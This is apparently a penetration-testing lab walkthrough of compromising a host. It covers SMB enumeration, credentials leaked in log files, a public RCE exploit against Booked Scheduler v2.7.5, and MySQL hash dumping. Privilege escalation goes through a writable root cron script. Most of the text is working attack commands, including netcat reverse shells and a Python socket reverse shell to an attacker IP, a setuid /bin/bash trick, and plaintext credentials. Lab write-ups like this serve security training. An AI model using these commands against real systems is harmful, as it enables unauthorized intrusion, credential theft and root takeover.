nmap shows ports 21 ftp, 22 ssh, 139 netbios, 445 smb, 3306 mysql open
Nmap deep scan shows port 8003 web
`nxc smb 192.168.226.64 -u '' -p '' --shares`
ftp is locked down
shows there's a read access on zino share

`smbclient -N  \\\\192.168.226.64\\zino`
we find a bunch of log files, in auth.log, we find peter:chauthtok
and in misc.log, we find admin:adminadmin

peter's password doesnt work for ssh
so we pay a little visit to 8003
Thre're a dir listing, "booked", which, when we click, takes us to a login page
Now, we use the admin:adminadmin creds, and we get in
Upon getting logged in, we see "Booked scheduler v2.7.5", to which searchsploit has rce exploit

run the exploit, and get shell as www-data
then we send a nc shell back, for something more stable

in /var/www/html/booked/config/config.php, we find
```
$conf['settings']['database']['type'] = 'mysql';
$conf['settings']['database']['user'] = 'booked_user';        // database user with permission to the booked database
$conf['settings']['database']['password'] = 'RoachSmallDudgeon368';
$conf['settings']['database']['hostspec'] = '127.0.0.1';        // ip, dns or named pipe
$conf['settings']['database']['name'] = 'bookedscheduler';
```

`mysql -h 127.0.0.1 -u booked_user -D bookedscheduler -p`
logs us in, in users table, we find
| admin   | 979b3db10cd396e6886cda954958040910e6a670 | 089ce325 |
Possibly the adminadmin password hash

so we switch databases.
`show databases; use mysql; show tables; select * from user;`
`localhost | root        | *9AF06340C37C08DD869A7288457112DB596A04D6`
no hashes cracked, was all waste

There aws a cleanup.py file, which we have write permissions over, and it is getting run by root, evident from `cat /etc/crontab`

so we just send a nc shell to us, or do the u+s /bin/bash thing
`echo "os.system('/usr/bin/nc 192.168.45.156 21 -e /bin/sh')" >> cleanup.py`
the chmod u+s /bin/bash worked
```zsh
echo "#python
import os
import sys
os.system('touch /tmp/tfl');os.system('/usr/bin/chmod u+s /bin/bash');os.system('usr/bin/nc 192.168.34.156 22 -e /bin/sh')" > cleanup.py
```

---
---
---
```zsh
echo "" > /var/www/html/booked/cleanup.py

cat <<EOT>> /var/www/html/booked/cleanup.py

> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.156",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

> EOT
```